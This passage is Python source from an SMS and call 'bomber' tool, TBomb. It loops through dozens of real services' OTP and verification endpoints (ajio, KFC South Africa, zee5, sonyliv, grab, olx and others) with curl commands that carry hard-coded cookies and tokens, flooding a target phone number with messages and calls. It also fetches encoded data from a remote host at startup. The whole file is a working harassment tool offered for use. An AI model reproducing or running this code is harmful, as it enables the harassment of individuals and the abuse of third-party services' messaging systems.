  rd=os.popen('curl -s -X GET -H "Host:mobisub.cricwick.mobi" -H "Connection:keep-alive" -H "Upgrade-Insecure-Requests:1" -H "User-Agent:Mozilla/5.0 (Linux; Android 5.0.2; SH-04G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "DNT:1" -H "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US,en;q=0.9" "http://mobisub.cricwick.mobi/main/send_pin?phone=0'+pn+'&udid=adsd&sub_type=1"').read()
  return rd.find("successfully")!=-1
 elif lim==23:
  os.system('curl -s -X POST -H "Host:www.easypaisa.com.pk" -H "Connection:keep-alive" -H "Content-Length:65" -H "Accept:*/*" -H "Origin:https://www.easypaisa.com.pk" -H "X-Requested-With:XMLHttpRequest" -H "User-Agent:Mozilla/5.0 (Linux; Android 5.0.2; SH-04G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "DNT:1" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:https://www.easypaisa.com.pk/easypay/easypaisaaccount" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9" -H "Cookie:_ga=GA1.3.777600003.1559475843; CACHED_FRONT_FORM_KEY=abMuPT3gfEKS0cYf; _gid=GA1.3.605399398.1559718125; _gat=1" -d \'form_key=abMuPT3gfEKS0cYf&cnic=42401-5683737-3&msisdn=0'+pn+'\' "https://www.easypaisa.com.pk/easypay/easypaisaaccount/index/otp/"  > /dev/null 2>&1')
  return True
 elif lim==24:
  rd=os.popen('Textoo PAK Custom SMS API').read()
  return rd.find("hi!")!=-1
 elif lim==25:
  rd=' '
  try:
   rd=os.popen(' curl -s -X POST -H "Host:www.ajio.com" -H "Connection:keep-alive" -H "Content-Length:144" -H "Accept:application/json" -H "Origin:https://www.ajio.com" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/json" -H "Referer:https://www.ajio.com/signup" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "Cookie:_ga=GA1.2.979928319.1560364071; _gid=GA1.2.666270216.1560364071; V=201; _fbp=fb.1.1560364076913.1528349725; cto_lwid=d91bea3a-7610-45aa-8f78-65a0d740fb46; PushSubscriberStatus=DENIED; peclosed=true; G_ENABLED_IDPS=google; TS018cc593=01ef61aed0fca110f50d8e3be2c66eb83188f6df8495c0ed2cd772829370fc12690954aad0834f545b57764467dbb66efb05d481a8958aebb273751956ef9eb383a3ba22dd1c94d82021e9d4c40011d4ab9bd97c6f0a74628ac12e8f7bcb663c1608e7288ebd252051cb84def3b021d3bcf643d3f3728ca9c0d9c780d171578ba966774f11ac44864a7f3da59791cb55f2741f23d72f7843efe9306459c00ec2e5f00065729a8573baba42384bb7cf46eb55cf89f72f1dcd5619a26e4ff32c63d06cac8c4bb158da6640bc0b11193134cbf38050ae0db230aa258b1181749fb0373afe041ad1aeffd0c08be7a62010db02cc65edfb1341d2de54cdf475c5dcd84e16c64c50; _gac_UA-68002030-1=1.1560366197.Cj0KCQjwxYLoBRCxARIsAEf16-tx5UXrrP9SEhR8dPkTL4a9woEF7Ae-kvSlzKdgq35y31DeK3_uhg8aAkRBEALw_wcB; cdigiMrkt=utm_source%3A%7Cutm_medium%3A%7Cdevice%3Amobile%7Cexpires%3AFri%2C%2012%20Jul%202019%2019%3A03%3A17%20GMT%7C; ImpressionCookie=4; ip=10.1.10.1; sessionStatus=true|undefined; FirstPage=Thu Jun 13 2019 00:33:53 GMT+0530 (India Standard Time); _dc_gtm_UA-68002030-1=1; uI=johnyaho%40gmail.com; TS01fe4249=01ef61aed09c32c6a53ce9e431a6a719c416867f2f3ad713fde2e74175bc248acc7a523f41e9751d032859a159bfff87664b90c3d0a9dfb2392f75876ccbe273b8a8e81d7a8d25047453c17a2905eca7eff26b780c" -d \'{"firstName":"Rox","login":"johnyaho@gmail.com","password":"Rock@5star","genderType":"Male","mobileNumber":"'+pn+'","requestType":"SENDOTP"}\' "https://www.ajio.com/api/auth/signupSendOTP" ').read()
  except:
   return True
  if rd.find("\"statusCode\":\"1\"")!=-1:
   return True
  else:
   return False
 elif lim==26:
  con='{"country_code":"'+cc+'","phone_number":"'+pn+'"}'
  os.popen('rm temp.xxx2 > /dev/null 2>&1')
  os.system('curl -s -X POST -H "Host:api.cloud.altbalaji.com" -H "Connection:keep-alive" -H "Content-Length:'+str(len(con))+'" -H "Accept:application/json, text/plain, */*" -H "Origin:https://lite.altbalaji.com" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36" -H "Content-Type:application/json;charset=UTF-8" -H "Referer:https://lite.altbalaji.com/subscribe?progress=input" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -d \''+con+'\' "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN" -o temp.xxx2')
  while not os.path.exists('temp.xxx2'):
   time.sleep(0.1)
  rd=hashlib.md5(open('temp.xxx2','rb').read()).hexdigest()
  return rd=='24f467b24087ff48c96321786d89c69f'
 elif lim==27:
  rd=os.popen('curl -s -X POST -H "Host:www.aala.com" -H "Connection:keep-alive" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Origin:https://www.aala.com" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:https://www.aala.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "Cookie:frontend=a27mn3h3irt1rlt6i55s93p9r5; frontend_cid=8zqBBzwQTMIt9UKg; _BEAMER_USER_ID_gADrycBn12870=c9fe4f7d-b421-4bad-9cf2-0a4db716dff4; G_ENABLED_IDPS=google" -d \'email='+cc+pn+'&firstname=SpeedX&lastname=SpeedX\' "https://www.aala.com/accustomer/ajax/getOTP"').read().strip()
  return rd.find('code:')!=-1
 elif lim==28:
  rd=os.popen('curl -s -X POST -H "Host:order.kfc.co.za" -H "Connection:keep-alive" -H "Content-Length:47" -H "Accept:*/*" -H "Origin:https://order.kfc.co.za" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "Content-Type:application/json; charset=UTF-8" -H "Referer:https://order.kfc.co.za/account" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "Cookie:_gcl_au=1.1.415929807.1561493569; _ga=GA1.3.469985166.1561493570; _gid=GA1.3.1398024331.1561493570; _fbp=fb.2.1561493578852.536988923; KFCSA.A.SID=tmdsjbjoy0qbmuyhmbyxvalf; KFCSA.OM=None; KFCSA.ASD=False; KFCSA.IPO=False; __RequestVerificationToken=CxSvnMqHMj8YbBrhLGj7vUPBUXqyE6RLWm1RUXPi5eeHGiDnHs7CayPdC-0b9QwGFHR_04i7-bKzqWteU3FMMzrLbeAVVxe40G2t8luaoLE1; AWSELB=E5D5F3DB0674D2DD489505036EC8717CCE48ECC7D6582B18BB63707B29C58E3BA56C384788DD4DDE848FD124A890D4250CB597550004B5388034AC34B474505B17B982E99F; ak_bmsc=6B2B277A0ADE1EB4791B5E39533F8EDB312C82479F5A000059FE125D9653E839~plMt7mFNuRbjuAppgJpOWmjbDaPsUTaJUC8l6tMJu4FZpwhGKTqyBlqgSWhqVivPxy90lBKs0z5hkM3V+Bwumb9ebimjXZ1w0OZWmM75qYcRbBthL3juMnDRkSIqy4xJ6xjL00+PYNSY66D7ND7KCVPD5GbX/mHF3HEHbFaIMM/1epigYTZ+HAC5ZazkeC2pIKmipGnUxsTyxja0dDOzFiFnDayI40Y+m8cwR7tgSH718=; bm_sv=26C6FC7B350B4395B524E6406A990647~4ONc+5z9ekxeCuv48FkqhFIJyUedeQfbC6WnOrnzCJQOh80fPn0T8woglrbabj3szRwkSd1gh0iACfVAGMuCDmwYy9ZqV7Ojul8uz3/ESjnBfnXHERDm1m+GW7dsOxn3rdVX21qWn8EUQZT/KM3gP5xEZqkcbwOaObu49xkQtWk=" -d \'{"phone":"0'+pn+'","email":"Niga@gmail.com"}\' "https://order.kfc.co.za/Register/CreateOtp"').read()
  return rd.find('true')!=1
 elif lim==29:
  os.system('curl -s -X GET -H "Host:m.vconnect.com" -H "Connection:keep-alive" -H "Accept:application/json, text/plain, */*" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "Referer:https://m.vconnect.com/userverification?rdrt=1&formid=79&prevenquirycode=&loggedinuserid=0&email=AnthonyAnthony8585%40gmail.com&sessionid=1073080&countryname=nigeria&statename=Nigeria&enquirycode=E9EB8D71-2391974&islisting=0&keyword=computer-repair-servicing&lpvalue=&skuid=0&user_id=&phone=09081188473&name=Tony&state_id=&sku_id=&enquiry_code=E9EB8D71-2391974&service_id=75&ph=09081188473&state=Lagos&enquirytype=4" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "Cookie:ASP.NET_SessionId=k2kbshrfz0xcua1v402p4kny; cartcount=0; __utmmobile=0xCD75CE0C8CBCDA2D; _ga=GA1.2.1356871419.1561488839; _gid=GA1.2.989632396.1561488839; _fbp=fb.1.1561488840323.903650532; WZRK_G=355069c6756a4c63a464f47daab65a81; sessionId=1100407; searchpagelogid=0; EnquiryCode=E9EB8D71-2391974; vc_config={%0d%0a  "CountryId": 1,%0d%0a  "CountryName": "Nigeria",%0d%0a  "StateId": 125,%0d%0a  "StateName": "Lagos",%0d%0a  "CityId": 0,%0d%0a  "CityName": "",%0d%0a  "ISDcode": "234",%0d%0a  "isPackage": 1,%0d%0a  "PaymentGateway": "Paystack",%0d%0a  "SMSGateway": "Clevertap",%0d%0a  "countrycode": "NG",%0d%0a  "Currencycode": "NGN",%0d%0a  "flag": "http://vccloud.blob.core.windows.net/vcsites/vcimages/resource/uploads/flagicons/nigeria.png",%0d%0a  "currency": "Naira",%0d%0a  "PhoneLength": 11,%0d%0a  "Timezone": "UTC +1"%0d%0a}; vcSearchCountry=nigeria; vcSelectedLocation=lagos; UserCountry=Nigeria; vcSearchLocation=Nigeria; vcSearchCountry=Nigeria; WZRK_S_W96-68K-RZ5Z=%7B%22p%22%3A3%2C%22s%22%3A1561493379%2C%22t%22%3A1561494504%7D" "https://m.vconnect.com/TypoForm/VerificationNew?fullname=Tony&emailId=AnthonyAnthony8585@gmail.com&mobile=0'+pn+'&num=4&EnquiryCode=E9EB8D71-2391974&IsOTPverified=0&location=&sku=" > /dev/null 2>&1')
  return True
 elif lim==30:
  os.system('curl -s -X POST -H "Host:omniapi.omnibiz.com" -H "Connection:keep-alive" -H "Content-Length:32" -H "Origin:https://omnibiz.com" -H "Source:OnBoarding" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "Userid:1607530" -H "Content-Type:application/json" -H "Accept:application/json, text/plain, */*" -H "countrycode:1" -H "Businessid:1599956" -H "Save-Data:on" -H "Token:Sh6SKZ/51kiJyk5WFT/zQYgvFVddbARp" -H "Referer:https://omnibiz.com/registerbusiness/sms" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -d \'{"Phone":"0'+pn+'","Flag":1}\' "https://omniapi.omnibiz.com/api/OnBoarding/ResendOtp" > /dev/null 2 >&1')
  return True
 elif lim==31:
  os.popen('curl -s -X POST -H "Host:userapi.zee5.com"  -H "x-z5-appversion:15.22.33" -H "accept:application/json, text/plain, */*" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "x-z5-appplatform:Web Mobile" -H "content-type:application/json" -H "origin:https://www.zee5.com" -H "referer:https://www.zee5.com/register/mobile" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -d \'{"mobile":"'+pn+'","password":"roxxxddmd","first_name":"","last_name":"","mac_address":"","additional":{"gdpr_policy":[{"country_code":"IN","gdpr_fields":{"policy":"yes","profiling":"na","age":"yes","subscription":"na"}}],"guest_token":"61785dd361da612b9ee4","sourceapp":"Web","version_number":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36","promotional":{"on":"1","token":""},"first_time_login":"1"}}\' "https://userapi.zee5.com/v2/user/registermobile" -o temp.xxx')
  os.popen('curl -s -X POST -H "Host:userapi.zee5.com" -H "x-z5-appversion:15.22.33" -H "accept:application/json, text/plain, */*" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "x-z5-appplatform:Web Mobile" -H "content-type:application/json" -H "origin:https://www.zee5.com" -H "referer:https://www.zee5.com/register/mobile" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -d \'"'+cc+pn+'"\' "https://userapi.zee5.com/v2/user/resendconfirmationmobile" -o temp.xxx')
  return True
 elif lim==32:
  rd=os.popen('curl -s -X POST -H "Host:www.sonyliv.com" -H "x-build:1e2f1b8ff0eb2e79b57f0246f6c743477c736c846c92dc7bbd779bf5d2ce4f2ead589deebbd542f09183b22b5e720de729b1ae1fdb678beb6577fb5197f5c3940e6190cd9fdef7ff80287022cc512b410513ebcee73c084e230597b2fa8e23709dd0da1bf0c27381c50678bfe00305a1" -H "origin:https://www.sonyliv.com" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "content-type:application/json;charset=UTF-8" -H "accept:application/json, text/plain, */*" -H "x-via-web-device:true" -H "save-data:on" -H "dmadetails:{"message":"SUCCESS","dmaID":"IN","channelPartnerID":"MSMIND","isdCode":"'+cc+'","signature":"733e037fedd1f43a8b1adc43fdc706048d12886626951b6b7549d0e1a86bc40ff888c28fc3b1ed5012fa38cee0bd82f34f9c38ac2698b90cf673160900b8928b23ae71c0c86b5746f8389f4321a4862d2852177e61087130c42afb2112fc5cce0d759123b5bc978c0300ed690d35bddd35d25f21114f93f4d361c686dbb967a9"}" -H "referer:https://www.sonyliv.com/signup" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "cookie:LastUpdatedTime=2019-07-17%2017:57:17" -H "cookie:AWSALB=+WHN8N57gbzEMwx/XthS4Ya6G+oMZHehptLYzPALMIWI8nHlCeboOT63n63l1MVTIBZ0zt825gCC+JQSgX+kmTTg23JyCNT8VA1qj0tfdklf+gATLAKlZTDPdX03yLPmbKT27AGNaBuHe3aVTEANMz6CnkoSdQkKZC9h2nKEBB1v8ziYmT5KFzXx7k5duw==" -H "cookie:_gat_UA-34728540-12=1" -H "cookie:userLoc=%7B%22positions%22%3A%2223.974727%2C72.9436574%22%7D" -H "cookie:_gat_UA-34728540-15=1" -H "cookie:_fbp=fb.1.1563366405680.833249251" -H "cookie:_dc_gtm_UA-34728540-15=1" -H "cookie:_dc_gtm_UA-34728540-12=1" -H "cookie:_gid=GA1.2.912038787.1563366403" -H "cookie:_ga=GA1.2.1219947502.1563366403" -H "cookie:WZRK_S_48K-8WW-754Z=%7B%22p%22%3A1%2C%22s%22%3A1563366401%2C%22t%22%3A1563366401%7D" -H "cookie:WZRK_G=e4692607aee2428b882b491633008d4a" -H "cookie:ajs_user_id=%22b1d3b429-447c-49fe-9cf6-95e8709b2bb3%22" -H "cookie:ajs_anonymous_id=%229ae9546c-70d0-4090-b112-4181e1c42374%22" -H "cookie:ajs_group_id=null" -H "cookie:deviceId=b1d3b429-447c-49fe-9cf6-95e8709b2bb3" -H "cookie:AppStartTime=2019-07-17%2017:56:23" -H "cookie:currentXdrItem=null" -H "cookie:xdrItems=[]" -H "cookie:_rsid=80725337889" -H "cookie:_gcl_au=1.1.1706846910.1563366380" -H "cookie:G_ENABLED_IDPS=google" -d \'{"channelPartnerID":"MSMIND","mobileNumber":"'+pn+'","country":"'+cnn+'","timestamp":"2019-07-17T12:27:20.363Z"}\' "https://www.sonyliv.com/api/v4/auth/createOTP"').read().lower().strip()
  return rd.find('success')!=-1
 elif lim==33:
  os.popen('curl -s -X POST -d \'method=SMS&countryCode=id&phoneNumber='+cc+pn+'&templateID=pax_android_production\' "https://api.grab.com/grabid/v1/phone/otp"')
  return True
 elif lim==100:
  rd=os.popen('curl -s -X GET "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/'+pn+'?callType=otpOnCall"').read()
  return rd.lower().find("new otp has been")!=-1
 elif lim==101:
  rd=os.popen('curl -s -X POST -d mobile=%2B'+cc+'-'+pn+' https://marketing.tllms.com/elearn/api/v4/authentications/phone_call').read()
  return rd.lower().find("otp requests exceeded")==-1
 elif lim==102:
  rd=os.popen('curl -s -X POST -H "Host:www.realestateindia.com" -H "content-length:58" -H "accept:text/html, */*; q=0.01" -H "origin:https://www.realestateindia.com" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.realestateindia.com/thanks.php?newreg" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:_gat=1" -H "cookie:rei_mem_mobile_verify_status=0" -H "cookie:rei_mem_email_verify_status=N" -H "cookie:rei_mem_block_status=0" -H "cookie:rei_member_country=IN" -H "cookie:rei_paid_status=0" -H "cookie:rei_member_type=1" -H "cookie:rei_member_email=Fakemam%40ril.com" -H "cookie:rei_member_name=Fakeman" -H "cookie:rei_member_id=1547045" -H "cookie:cooki_sess_id=9q8bsucj6mgvu2dc03bfsvlf07" -H "cookie:name=9q8bsucj6mgvu2dc03bfsvlf07" -H "cookie:_gid=GA1.2.626525909.1560836369" -H "cookie:_ga=GA1.2.1033079331.1560836369" -H "cookie:visitedToken=176961560836367" -d \'action_id=call_to_otp&mob_num='+pn+'&member_id=1547045\' "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php?sid=0.5983221395805354"').read()
  return rd.lower().find("y")!=-1
 elif lim==103:
  os.system('curl -s -X POST -H "Host:www.olx.in" -H "content-length:44" -H "accept:*/*" -H "x-newrelic-id:VQMGU1ZVDxABU1lbBgMDUlI=" -H "origin:https://www.olx.in" -H "user-agent:Mozilla/5.0 (Linux; Android 5.0.2; SH-04G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/json" -H "referer:https://www.olx.in/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -H "cookie:onap=16b1b8f48d4x746d47ab-1-16b1b8f48d4x746d47ab-19-1559537345" -H "cookie:bm_sv=CDB97F50DA6615AC420F3E6E77B04E42~OoX2fAuP7ggcNa0VjzE95FzJNKRdJlW09Hja0/cysIGF1sJoBO7i0ndGXqnTWLaunlyxktHLbE8BSstPCRYn8VdP15lvUxK3ZY9ahXOSgwAidxwXd1jCe5wjIzYbiXp5eKNWfFpowhFbpxloe+SrbiE0YHJVPcCV5bmdsHgPfQc=" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:hint=true" -H "cookie:_gid=GA1.2.369819276.1559535517" -H "cookie:_ga=GA1.2.665688753.1559535517" -H "cookie:ldTd=true" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:HIDE_ONBOARDING_LOCATION=true" -H "cookie:testCookie=testCookie" -H "cookie:ak_bmsc=307C5311FB00A3F4E856AFFE1A9D000B0214BED9E0210000909FF45C1E802067~plFZfbMQGgEDr7OWVe9FvqfT24ZtOVMamtYcaip71IYOrv2+SQ6fokSvMk2Uesz5v1sFfaichbtDgeVSj3te3vXJKezSWgvoVWrK7gfzFrLz1ruBm0MQj01V5CmpaTr6tRgDRSN6bks3nqvOHzR0tA1IoqfDfq2MKtmDjbknCI5FlLYUTwqlnwHowYArfybn2n3yilE6VKHjW+tH8kqjAfH8BGuijpmO9pNkgmIyOeaZIVM3k6FGOL3Wj3jLI8uGaU" -H "cookie:_abck=153BD3D333948A58932748CAC3D4C3F40214BED9E0210000909FF45C18838E05~0~8O+udxdG38sBFTPZpaBL4IGj7eUcKJ1VwAtJ52GMO5E=~-1~-1" -H "cookie:bm_sz=BD665D919F7C6FA8374F196445596436~YAAQ2b4UArpOAwtrAQAAq0qPGwNksHBgphLwDzwfBlwIRQJAG7txmjBo/of7NiAJ93gy/7vBhQ9l5sIKdwtl2j+U4bys2Hhh5tZlZL/jqdnW/JrgmgawcxiunAJ32BbY9UtnFIrNxbbRvzQCYnSwf/cz9a7jURsui7leuLaVm7mQEcHPOtC6g5jrToAMTbdA" -H "cookie:97c09e2aabdfed89b87a3010d7f13c64=353b4f9fd82d26268ad11b2c1e9ae019" -H "cookie:lqstatus=1559536704" -H "cookie:laquesis=pan-26381@a#pan-27752@b#pan-30043@b#pana-26381@b" -d \'{"type":"call","descriptor":"+91'+pn+'"}\' "https://www.olx.in/api/challenges" >/dev/null 2>&1')
  return True
 elif lim==104:
  rd=os.popen('curl -s -X GET -H "Host:api.magicbricks.com" -H "Connection:keep-alive" -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Safari/537.36" -H "Save-Data:on" -H "Accept:image/webp,image/apng,image/*,*/*;q=0.8" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile='+pn+'"').read()
  return rd.lower().strip().find('callmade')!=-1
 elif lim==105:
  rd=os.popen('curl -s -X POST -H "Host:www.capitalfirst.com" -H "Connection:keep-alive" -H "Content-Length:23" -H "Accept:*/*" -H "Origin:https://www.capitalfirst.com" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:https://www.capitalfirst.com/personal-loan-verify-mobile" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "Cookie:_ga=GA1.2.1398048285.1560652764; _gid=GA1.2.1096483080.1560652764; _fbp=fb.1.1560652766930.1354503182; BNES_ci_session=OZ4SQ5w7lWfaCnCQw/067sA6wNcenr8K1Ch1eNCluslGPPzLpASxU8OwhfIMMcYSWRZmopMRcOUGfvgCIxkhQVVvhXcUTbk6; _gat_UA-36221369-1=1" -d \'mobileNumber='+pn+'\' "https://www.capitalfirst.com/Personalloan/generateOTP"').read()
  return rd.find("1")!=-1
 elif lim==106:
  rd=urllib.request.urlopen("https://www.myupchar.com/user_profile/resend_otp_via_voice?id="+pn).read().decode('utf-8')
  return rd.find("1")!=-1
 return False
def remsp(num):
 num=num.replace(' ','')
 num=num.replace('-','')
 return num
def start(target,counter,delay,ch,cc):
 os.system("clear")
 banner()
 failed=0
 requested=0
 success=int(requested)-int(failed)
 bombs=int(counter)+1
 while success<(int(bombs)):
  os.system('clear')
  banner()
  try:
   api=random.choice(ch)
  except:
   if cc=="91":
    print('Sorry All APIs Have Expired Please Update TBomb')
    input('Press Enter To Exit...')
    exit()
   else:
    if success>0:
     print('\n\n\tWe Are Sorry To Say That Bombing Limit For Your Country Has Been Reached...')
     print('\nWe Are Working Too Hard To Increase The International Limit...')
     print('\tIf You Want To Help Find Some Local Sites In your Country like hotel services, shopping sites , etc. that verify you number by OTP and send it to my gmail along with country name and country code...')
     input('\nThis will help us to give support to your country fast...\n\nPress Enter To Exit...')
     os.system('rm *.xxx* > /dev/null 2>&1')
     print('\n\n')
     banner()
     exit()
    else:
     print('\n\n\tSorry Your Country is Not Supported...')
     print('\t\tPlease Send A Mail To ggspeedx29@gmail.com To Let Us Know...')
     input('Press Enter To Exit...')
     exit()
  print("==================================================================")
  print("                BOMBING in progress, please wait !!               ")
  print("     Please keep your data connection active during bombing !!    ")
  print("==================================================================")
  print("             Target Number           : +"+str(cc)+" ",target)
  print("             Number of Requests Sent : ",requested)
  print("             Successful Requests     : ",success)
  print("             Failed Requests         : ",failed)
  print("==================================================================")
  print("              Use this for fun, not for revenge !!                ")
  print("              This Bomber Was Created By SpeedX !!                ")
  print("              Hacked by https://vk.com/ld611                       ")
  print("==================================================================")
  result=getapi(target,api,cc)
  requested=requested+1
  if result:
   success=success+1
  else:
   failed=failed+1
   while ch.count(api)>0:
    ch.remove(api)
  time.sleep(float(delay))
  if requested%3==0:
   checkintercept()
 print('\n\nBombing Completed..')
 os.system('rm *.xxx* > /dev/null 2>&1')
 banner()
 exit()
def checkin(num):
 if num.startswith('91'):
  try:
   fcd=open(os.environ['PREFIX']+'/user.dat','r')
   ci=fcd.read()
   fcd.close()
   ci=decdat(ci.replace('\n','')).split('\n')
   po=[]
   ti=[]
   for x in ci:
    if len(x)<5:
     continue
    pos=x.find('~')
    po.append(x[:pos])
    ti.append(datetime.strptime(x[pos+1:].strip(),'%m/%d/%Y %H:%M:%S'))
   st=-1
   rec=datetime.now().strftime('%m/%d/%Y %H:%M:%S')
   rec=datetime.strptime(rec,'%m/%d/%Y %H:%M:%S')
   l=len(po)
   for x in range(l):
    if int((rec-ti[x]).total_seconds())>86400:
     po.pop(x)
     ti.pop(x)
     continue
    elif st==-1:
     st=x
   pl=''
   if st==-1:
    st=l
   for x in range(st,l):
    pl=pl+po[x]+'~'+str(ti[x])+'\n'
   pl=pl+num+'~'+str(rec)
   fcd=open(os.environ['PREFIX']+'/user.dat','w')
   fcd.write(encsv(pl))
   fcd.close()
   if(l-st)>5:
    pass
    #human()
  except:
   fcd=open(os.environ['PREFIX']+'/user.dat','w')
   rec=datetime.now().strftime('%m/%d/%Y %H:%M:%S')
   pl=num+'~'+str(rec)
   fcd.write(encsv(pl))
   fcd.close()
   #human()
 else:
  #human()
  pass
 print('\n\t\tThank God !!! You Are A Human...')
 print('\nPress Enter To Proceed...')
def human():
 checkintercept()
 res=urllib.request.urlopen("https://raw.githubusercontent.com/TheSpeedX/test/master/bomb.code")
 bc=res.read().decode(res.headers.get_content_charset()).split('\n')
 print('\n\n\t\tSorry To Interrupt !!!\n')
 bc=decdat(bc[0])
 bc=bc.split('\n')
 cod=''
 while len(cod)<5:
  cod=random.choice(bc).strip()
 lnk=cod.split('~')[1]
 cod=cod.split('~')[0]
 print('But Due To Heavy Requests To TBomb We Need To Verify You ...')
 while True:
  print('You Just Need To Go To This Link:   \n\n\n\t\t'+lnk)
  print('\n\nAnd Enter The Code Here')
  cd=input('Code: ')
  if cd.strip()==cod.strip():
   return
  else:
   print('Sorry The Code Is Incorrect !! \n\tTry Again...\n\n')
def encsv(dat):
 b1=base64.b64encode(dat.encode('ascii')).decode('utf-8')
 b1=random.choice(string.ascii_letters)+random.choice(string.ascii_letters)+b1+random.choice(string.ascii_letters)
 b1=base64.b64encode(b1.encode('ascii')).decode('utf-8')
 return b1
def decdat(dat):
 c=base64.b64decode(dat).decode('utf-8')
 c=c[2:-1]
 c=base64.b64decode(c).decode('utf-8')
 return c
os.system("clear")
banner()
try:
 urllib.request.urlopen('https://www.google.com')
except:
 print("You are not connected To Internet!!!")
 print("\tPlease Connect To Internet To Continue...\n")
 input('Exiting....\n Press Enter To Continue....')
 exit()
print('Please Wait While We Verify TBomb...')
res=urllib.request.urlopen("https://raw.githubusercontent.com/TheSpeedX/test/master/bomb.enc")
tx=res.read().decode(res.headers.get_content_charset()).split('\n')
tx.remove('')
for s1 in tx:
 f1=s1[:s1.find(':')]
